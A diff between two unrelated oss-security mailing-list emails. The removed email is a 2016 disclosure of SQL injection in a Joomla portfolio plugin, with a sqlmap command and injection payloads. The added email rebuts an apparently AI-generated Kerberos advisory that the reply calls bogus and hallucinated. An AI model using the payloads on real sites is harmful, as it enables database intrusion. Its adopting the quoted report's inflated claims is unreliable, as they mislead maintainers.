@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["2897" "Friday" "23" "September" "2016" "03:50:33" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>" "68" "[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery" nil nil nil "9" "2016092307:50:33" "[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery" (number mark "U       larry0@me.co Sep 23   68/2897  " thread-indent "\"[oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 30427 invoked by uid 550); 23 Sep 2016 07:50:55 -0000
+Received: (qmail 32671 invoked by uid 550); 19 Feb 2026 19:37:21 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,98 +7,284 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30296 invoked from network); 23 Sep 2016 07:50:50 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=4d515a;
-	t=1474617038; bh=Uc9JQqPKl4g3ebL+/bUsyfeIDNMxw5hsUv+qDCCefZQ=;
-	h=Subject:From:Content-type:Message-id:Date:To:MIME-version;
-	b=EsRfXJut/1siX8ihYp2sLc+HRmsimP2k7SX2dBX9gsrEiYwmPqqiV1TKOUv3IixFb
- AzB0imreSyVYTW2cfRwYluLqlm5abMDXdY9HYha+KApQuDVnZ2zgFiSoLDxbrgm7DQ
- aFLgCrrfaKykTceMLHqUkI20RQdrPfsyPV6k7qtEzSzHw7cnlsjqL55EJnUluSEV7E
- EEqdUTWm4iGk6a/cYX+ykfeggXR+AUkK/T2xs23QFIi2Imb9a+iHZstrLUnSwfU3SY
- 5oa03+0a6mffwvx1IAwWFg5dsImBgfaPFw25ygbG+Xwc0Brj9P4zyD8cPBRMoMF8ae
- yHN9LVlMAHsQA==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2016-09-23_04:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1034 suspectscore=1 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1603290000 definitions=main-1609230142
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: multipart/alternative;
- boundary=Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129
-X-Mailer: iPad Mail (13G36)
-Message-id: <02DB2C41-3186-45AD-9FC9-639FE9B256C0@me.com>
-Date: Fri, 23 Sep 2016 03:50:33 -0400
+x-ms-reactions: disallow
+Received: (qmail 30545 invoked from network); 19 Feb 2026 05:23:31 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=gmail.com; s=20230601; t=1771478600; x=1772083400; darn=lists.openwall.com;
+        h=content-transfer-encoding:in-reply-to:from:content-language
+         :references:to:subject:reply-to:user-agent:mime-version:date
+         :message-id:from:to:cc:subject:date:message-id:reply-to;
+        bh=MX/LMPo+oZigW5c3cWtSL0qDbYB8o47SlDOLyOLRVYY=;
+        b=MDA43xfeFvP5JPmmD546RuIz5Y4x+ZKjDZIUKvTLOwXSeXCXgw9FkZjC+pTK7Q/+Ho
+         CHOKjR28YvotXLTW+1mpsY3y2SZF3kp3VdptDHxQ7POL9o/2w4wtV2LVFAMsiGNvvL6w
+         nXb6X/4oOKtWdEgoHFIPvMu0pDdeveDbxYJxPN8nmBdX9pmFF9ZzBK5S7kJaDUWpbv0h
+         HlS+2QQ87aJGV6flbwztn6Cm+pMxfhC15ChVh9cAwzR/kdZ+4yHvBnSUdU6zjUmVRqj1
+         wBCVHRxP5vVG7Yp1wR0Xy5pdFGJK+FfDhJiNhNxBPZtSp+tY5Z829JHNpcskgOpsxS/U
+         p6zw==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1771478600; x=1772083400;
+        h=content-transfer-encoding:in-reply-to:from:content-language
+         :references:to:subject:reply-to:user-agent:mime-version:date
+         :message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to;
+        bh=MX/LMPo+oZigW5c3cWtSL0qDbYB8o47SlDOLyOLRVYY=;
+        b=Yd8iTZE25hZ+WHAkPv6OaRWLrG4ilrPzI9mvD99sUj6ier+KoNvasWIIQklR3opGuJ
+         thr3BHIeK42EYDNCJG5r6Bg6ct/6NcE57FVLbQpLInlMEhZnCO+nzVH6E0TxYLeaiy3y
+         PuWwCx3sxx3M10X7bBP0hqW+iugTqf2KUNBMK0lxWcAH5SuL5N7DnAqn4X7a5MqqChQe
+         avxp/2i8VzSQLqfl+oRICHql8CJe6bLGm672qL+V8cURKJLEDJtPfx6FTT94MQY8hkNJ
+         841tdjjr0NSWzX/hht33hYT2yauCS+q63cE+L4TxZLcUn2gKRraZov/P5L0XsgV17rAZ
+         HOmQ==
+X-Gm-Message-State: AOJu0YwRw80N3XmZZ3VUFTYudgebFm5THjyUat6n92/MtlxLSb/HqdnI
+	p4BwNWncdKUJnELDHjOOr5rmPVnAwwMzzpAF3KCeMrkhGJ0P3BLqySPDWw0ZJQ==
+X-Gm-Gg: AZuq6aIEgD9PGuWSCSwneV/r1st0fk2Rgn5Qzg+auBO+x1c/mZTjtxleeqOesUsaMlV
+	u5n/T/ADccPQTIzY8RdzEm0xHXC66GrToKf2C6rTHC2PTL31PXACgcBFqXRpdd8+OJf9iBf2H2g
+	naUs7oUqU65R7sqdo4ZFW9NxeQU55LPjYus8dNyCI/MxCVUkNUt2ehrtOOZ1EES7i9eKDLqpSh8
+	pdRcZGLMJeJtS3U3uNQt5a2nAdVAqWATTbAml/AOs1A1NBg72PKi3sNGLdP3WcyYIbbnlUJFEex
+	xVPmc5e/cbcJhL9lHqekS7pZR3GgxE60Daeo14x+PWyvjYWv4WY6B3CmKfuM3jHCu9qBma03aRJ
+	jtM3pf729zfUvViHrqhRXFfTa7zIXTVmFKDQwDvZJemXY8Tpi3tKnGMdzGiwPhK0JNZiGakQu5b
+	sCMtFlSudPUPlxq5f4iwLXw+kGskRS
+X-Received: by 2002:a05:6871:341f:b0:404:396d:8bc0 with SMTP id 586e51a60fabf-41528fde7d3mr2408472fac.18.1771478599400;
+        Wed, 18 Feb 2026 21:23:19 -0800 (PST)
+Message-ID: <c9af5be5-fc3f-4ef9-bcb4-140a1d1fe1c2@gmail.com>
+Date: Wed, 18 Feb 2026 23:23:14 -0600
+MIME-Version: 1.0
+User-Agent: Mozilla Thunderbird
 To: oss-security@lists.openwall.com
-Content-transfer-encoding: 7bit
-MIME-version: 1.0 (1.0)
-Subject: [oss-security] Unauthenticated SQL Injection in Huge-IT Portfolio Gallery
+References: <20260219011438.GA17271@openwall.com>
+Content-Language: en-US
+From: Jacob Bachmeyer <jcb62281@gmail.com>
+In-Reply-To: <20260219011438.GA17271@openwall.com>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 8bit
+Subject: Re: [oss-security] MIT/Heimdal Kerberos credentials cache type FILE
+ risks
 
---Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129
-Content-Type: text/plain;
-	charset=us-ascii
-Content-Transfer-Encoding: quoted-printable
+On 2/18/26 19:14, Solar Designer wrote:
+> Hi,
+>
+> Raul Vega, CC'ed here, sent the below AI-generated message to
+> linux-distros on Feb 5, without disclosing the use of AI, yet correctly
+> set the public disclosure date to "2026-02-18 (14-day embargo per
+> linux-distros policy)" (or maybe the AI assistant did).
+That would be the first warning sign.
+>    Unfortunately,
+> there was no further correspondence (in particular, I got no reply to my
+> reply, also included below), and Raul failed to bring this to
+> oss-security on time on his own, so I am now doing it for him.  And yes,
+> I consider this borderline abuse of the list, which is why my tone.
+
+And this would be a second strike.
+
+> My summary of Raul AI's message is that Kerberos default_ccache_name
+> FILE is relatively unsafe compared to certain other possible kinds of
+> credentials cache supported via this setting, especially with respect to
+> local file inclusion vulnerabilities in other software such as web apps
+> running under the same user account.  The message suggests to use
+> KEYRING or KCM instead of FILE.
+
+My summary up front:  this report is bogus.
+
+> https://web.mit.edu/kerberos/krb5-1.22/doc/basic/ccache_def.html says
+> FILE is the default.  So it may be a case of unsafe default.  Can the
+> default reasonably be changed?  "KCM caches work by contacting a daemon
+> process", so will require this daemon to be running, and "KEYRING is
+> Linux-specific, and uses the kernel keyring support".  So maybe Linux
+> packages can use KEYRING by default?
+
+I would not be so sure about FILE being unsafe at all.
+
+> [...]
+>
+> I'd appreciate follow-ups by those familiar with Kerberos (I'm not)
+> and/or its packaging.
+
+While I cannot claim to be an expert on Kerberos, I did once seriously 
+evaluate deploying Kerberos telnet for server administration at a 
+previous $WORK, so I do know some aspects of the system.
+
+> [...]
+>
+> On Thu, Feb 05, 2026 at 10:24:03AM +0100, Raul Vega wrote:
+>> [vs] ADV-2026-005: Kerberos Credential Cache Lifecycle Failure and Bearer Token Theft
+>> Vulnerability Type: Semantic Design Flaw / Credential Dumping
+>>
+>> Affected Components: MIT/Heimdal Kerberos, Linux Core Dump Handlers, /tmp Defaults
+>>
+>> Researcher: Raul Vega del Valle
+>>
+>> CVSS 3.1 Base: 7.8 (AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+>>
+>> CVSS 3.1 Chain: 10.0 (Critical) (When chained with RCE/LFI)
+>>
+>> Public Disclosure Date: 2026-02-18 (14-day embargo per linux-distros policy)
+>>
+>> Executive Summary: The Semantic Gap
+>> The core of this vulnerability is a semantic failure in object lifecycle management. While the Kerberos protocol is syntactically secure, current Linux implementations fail to semantically bound the identity token (bearer ticket) to the process lifetime.
+
+Which process lifetime are we talking about here?  The kinit command 
+that obtains the TGT?  Bogus:  kinit is *supposed* to leave the ticket 
+for later processes to use.  The user's session? Arguable, but that is 
+why you are supposed to invoke kdestroy in your logout script.
+
+The other words, this issue was addressed a long time ago and is not a 
+problem if the environment is configured as recommended.
+
+>> By weaponizing the "Crash and Trash" scenario, an attacker can transform a transient authentication secret into a persistent forensic artifact. This allows an unprivileged local attacker???or a remote attacker via an RCE/LFI chain???to bypass Kerberos protocol guarantees and achieve complete network-wide identity theft.
+
+I call bogosity on this.  This does *not* extend the lifetime of the 
+ticket.  Further, the risks of "leaked" tickets and/or keys are 
+well-known in Kerberos, which is the reason MIT Kerberos supports 
+rotating service and KDC keys.  (When I last checked, Active Directory 
+had problems on this point.)
+
+>> Technical Analysis
+>> 1. File-System Persistence Vector
+>> Most Linux distributions default to the FILE: ccache type, storing tickets in /tmp/krb5cc_*.
+>>
+>> The Design Flaw: These tickets are bearer tokens. Possession of the file is equivalent to possession of the identity.
+
+That is not a design flaw.  That is the entire point of Kerberos 
+single-sign-on.  The need to secure the token has been well-understood 
+since Kerberos was invented.  A stolen ticket can be abused, exactly 
+like a stolen password can be abused, except tickets can expire much 
+more quickly.
+
+>> Exploitation: An LFI (Local File Inclusion) vulnerability in a web application can be used to "pull the trash" from /tmp, granting the attacker a valid TGT (Ticket Granting Ticket) with a ~10-hour TTL.
+
+Only if DAC is not being used properly.  If you are running a web 
+application as root, you have bigger problems than stolen Kerberos tickets.
+
+>> 2. Memory Lifecycle Failure (Crash and Trash)
+>> When an application handling Kerberos authentication crashes, the system generates a core dump (if enabled).
+>>
+>> The Semantic Gap: The credential remains in the heap or stack during the crash. Because many distributions do not restrict access to core dumps or leave them in unencrypted storage, these secrets become "trash" that is readily harvestable via standard string extraction.
+
+If, and only if, the application crashed during the authentication, or 
+did not take proper steps to discard the credential after using it.  
+Again, this is (probably) an application bug, although I am not familiar 
+enough with the Kerberos libraries to say what extent of care is taken 
+to extinguish no-longer-needed in-memory copies of tickets.
+
+Note that service tickets usually have much shorter lifetimes than TGTs, 
+since they only need to be valid long enough to "run" from the KDC to 
+the service, presenting the ticket at the latter.
+
+If I remember correctly, stealing anything other than a TGT is useless, 
+since service tickets are encrypted under a key in the TGT and contain a 
+session key for talking to that service.
+
+>> Impact: This bridges the gap from a simple application crash (Availability) to a full authentication bypass (Confidentiality/Integrity).
+>>
+>> The Grand Chain: The Case for CVSS 10.0
+>> While the individual components may be rated "High," the Semantic Addressing of this flaw creates a critical chain:
+>>
+>> Entry (RCE/LFI): Attacker gains limited execution or read access via a library flaw (e.g., Axios SSRF or Undici CRLF).
+>>
+>> Pivot (ADV-2026-005): Attacker provokes a crash or reads /tmp to dump the Kerberos ccache.
+
+Assuming DAC is properly used, (and a bug where it is not would have 
+been found *long* ago) the chain is killed here unless the attacker has 
+code execution under the targeted user's account, in which case 
+single-sign-on would be working properly.
+
+>> Escalation: The stolen ticket is replayed from the attacker's machine to access internal high-value targets (LDAP, S3 via IMDSv2, etc.).
+
+Maybe.  Kerberos TGTs can be restricted to network addresses of the host 
+to which they were issued.
+
+>> Result: Total identity takeover across the infrastructure without triggering traditional "credential theft" alerts.
+
+If the TGT was restricted (optional) to the user's box, the KDC is going 
+to notice when the attacker tries to use it from another node...
+
+>> Actionable Remediations for Distributions
+>> Distributions are requested to evaluate the following systemic changes to their default configurations:
+>>
+>> Restrict core_pattern: Ensure core dumps are directed to a secure, root-only directory by default.
+
+The only requirement is that core dumps are not readable by other 
+users.  They need not go to any specific directory.  There is no gain 
+from reading the core file *as* the user because any process belonging 
+to that user can already use the user's Kerberos credentials.  (That is 
+what single-sign-on *means*.)
+
+>> Default to KEYRING:: Shift the default default_ccache_name in /etc/krb5.conf from FILE to KEYRING or KCM (Kerberos Credential Manager) to keep tickets in unswappable, process-bound kernel memory.
+
+I call bogosity here.  The FILE credential store remains safe as long as 
+it is properly secured and the user's account is not otherwise 
+breached.  (Again, any task running as the user can authenticate with 
+the user's credentials.  That is what single-sign-on *means*.)
+
+>> Enforce fs.suid_dumpable: Harden kernel parameters to prevent unprivileged dumping of sensitive processes.
+
+One of the design features of Kerberos (as I recall) is precisely that 
+it does *not* require privileged processes run by the user. In other 
+words, this is useless in this context, although it might be useful for 
+defense-in-depth in general.
+
+>> Researcher: Raul Vega del Valle
+>>
+>> PGP Fingerprint: [Your Fingerprint]
+
+And here we see that this clown could not even be bothered to proofread 
+his AI slop enough to recognize that the AI had left a blank to fill in.
+
+> On Fri, Feb 06, 2026 at 10:06:18AM +0100, Solar Designer wrote:
+>> Hello Raul,
+>>
+>> [...]
+>>
+>> On Thu, Feb 05, 2026 at 10:24:03AM +0100, Raul Vega wrote:
+>> [...]
+>>> Technical Analysis
+>>> 1. File-System Persistence Vector
+>>> Most Linux distributions default to the FILE: ccache type, storing tickets in /tmp/krb5cc_*.
+>> What are the owners and permissions of those files?
+
+If they are not owned by the user and mode 0600, this would be a bug in 
+Kerberos that would have been exploited mercilessly on the shared 
+systems used long ago.  I would be *very* surprised if the DAC 
+permissions on those files are wrong.
+
+>>> Exploitation: An LFI (Local File Inclusion) vulnerability in a web application can be used to "pull the trash" from /tmp, granting the attacker a valid TGT (Ticket Granting Ticket) with a ~10-hour TTL.
+>> Would a web application have permissions to read the /tmp/krb5cc_* files?
+
+If it does, you have bigger problems than stolen Kerberos tickets.
+
+>>> Because many distributions do not restrict access to core dumps
+>> Which ones, for example?  And what do you mean by "do not restrict"?
+
+I believe that this means the AI was hallucinating.
+
+>>> Actionable Remediations for Distributions
+>>> Distributions are requested to evaluate the following systemic changes to their default configurations:
+>>>
+>>> Restrict core_pattern: Ensure core dumps are directed to a secure, root-only directory by default.
+>> This is typical already.  However, you can commonly access your own
+>> coredumps.  Same with your own /tmp files.
+>>
+>> So are you talking about potential restrictions within the same user
+>> account, so that sensitive information processed and available to the
+>> user previously does not remain available to the user for too long?
+
+Something like this could conceivably be implemented with SELinux, only 
+allowing processes that are supposed to be using Kerberos to access the 
+credential cache files, but I have not looked into it.
+
+>> How exactly does fs.suid_dumpable come into play, then?  In other words,
+>> do your suggested attacks involve processes that are "dumpable" or/and
+>> those that are not?  Which ones?  Please be very specific.
+
+I am fairly sure that, at least as far as Kerberos is concerned, it does 
+not come into play.  Another hallucination.
+
+>> I suggest that you clarify the above things in the public revision of
+>> your advisory.  As it is, it reads like a mix of sensible content with
+>> everything else an LLM "thought" is relevant, plus the sensationalism.
+Can we have a public Hall of Shame for AI-slop bogus reports?  I 
+nominate "Raul Vega del Valle" with this report as the inaugural entry.  
+Any seconds?
 
 
-Title: Unauthenticated SQL Injection in Huge-IT Portfolio Gallery Plugin v1=
-.0.6
-Author: Larry W. Cashdollar, @_larry0
-Date: 2016-09-16
-Download Site: http://huge-it.com/joomla-portfolio-gallery/
-Vendor: huge-it.com, fixed v1.0.7
-Vendor Notified: 2016-09-17
-Vendor Contact: info@huge-it.com
-Description: Huge-IT Portfolio Gallery extension can do wonders with your w=
-ebsite. If you wish to show your photos, videos, enclosing the additional i=
-mages and videos, then this Portfolio Gallery extension is what you need.
-Vulnerability:
-The following lines allow unauthenticated users to perform SQL injection ag=
-ainst the functions in ajax_url.php: In file ajax_url.php: 11 define('_JEXE=
-C',1); 12 defined('_JEXEC') or die('Restircted access'); . . . 49 $page =3D=
- $_POST["page"]; 50 $num=3D$_POST['perpage']; 51 $start =3D $page * $num - =
-$num; 52 $idofgallery=3D$_POST['galleryid']; 53 $level =3D $_POST['level'];=
- 54 $query =3D $db->getQuery(true); 55 $query->select('*'); 56 $query->from=
-('#__huge_itportfolio_images'); 57 $query->where('portfolio_id =3D'.$idofga=
-llery); 58 $query ->order('#__huge_itportfolio_images.ordering asc'); 59 $d=
-b->setQuery($query,$start,$num);
-CVE-2016-1000124
+-- Jacob
 
-Exploit Code:
-$ sqlmap -u 'http://example.com/components/com_portfoliogallery/ajax_url.ph=
-p' --data=3D"page=3D1&galleryid=3D*&post=3Dhuge_it_portfolio_gallery_ajax&p=
-erpage=3D20&linkbutton=3D2" --level=3D5 --risk=3D3
-=20
-=20
-(custom) POST parameter '#1*' is vulnerable. Do you want to keep testing th=
-e others (if any)? [y/N]
-sqlmap identified the following injection point(s) with a total of 2870 HTT=
-P(s) requests:
----
-Parameter: #1* ((custom) POST)
- Type: error-based
- Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
- Payload: page=3D1&galleryid=3D-2264 OR 1 GROUP BY CONCAT(0x71716a7a71,(SEL=
-ECT (CASE WHEN (3883=3D3883) THEN 1 ELSE 0 END)),0x7178627071,FLOOR(RAND(0)=
-*2)) HAVING MIN(0)#&post=3Dhuge_it_portfolio_gallery_ajax&perpage=3D20&link=
-button=3D2
-=20
- Type: AND/OR time-based blind
- Title: MySQL >=3D 5.0.12 time-based blind - Parameter replace
- Payload: page=3D1&galleryid=3D(CASE WHEN (9445=3D9445) THEN SLEEP(5) ELSE =
-9445 END)&post=3Dhuge_it_portfolio_gallery_ajax&perpage=3D20&linkbutton=3D2
----
-[13:30:39] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Debian 8.0 (jessie)
-web application technology: Apache 2.4.10
-back-end DBMS: MySQL >=3D 5.0.12
-[13:30:39] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 2715 times
-[13:30:39] [INFO] fetched data logged to text files under '/home/larry/.sql=
-map/output/192.168.0.4'
-=20
-[*] shutting down at 13:30:39
-
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D170
-
-
---Apple-Mail-C5F20AE1-0226-4C55-9C41-AAB490ECC129--
